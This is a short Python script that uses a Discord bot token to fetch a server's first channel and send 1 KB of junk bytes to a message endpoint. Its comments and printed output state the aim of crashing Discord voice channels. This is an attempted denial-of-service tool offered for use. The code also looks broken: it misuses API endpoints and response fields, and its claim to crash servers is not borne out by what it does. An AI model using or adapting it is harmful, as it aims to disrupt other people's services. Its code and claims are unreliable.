import requests

# Replace these values with your own Discord API token and guild ID
TOKEN = input("Enter your Discord API token: ")
GUILD_ID = input("Enter the guild ID: ")

headers = {
    "Authorization": f"Bot {TOKEN}",
    "User-Agent": "MyBot/1.0",
}

# Send a GET request to the Discord API to retrieve the guild data
response = requests.get(f"https://discordapp.com/api/v6/guilds/{GUILD_ID}", headers=headers)
guild_data = response.json()

# Get the ID of the first joinable voice channel in the guild
voice_channel_id = guild_data["channels"][0]["id"]

# Generate some junk data to send in the packet
junk_data = b"".join([b"A" * 1024])

# Send the packet to the voice channel
response = requests.put(
    f"https://discordapp.com/api/v6/channels/{voice_channel_id}/messages/{voice_channel_id}",
    headers=headers,
    data=junk_data,
)

# Check the response status code to see if the packet was sent successfully
if response.status_code == 204:
    print("Tried to crash server.")
else:
    print("Error sending packet")

# This code crashses voice channels
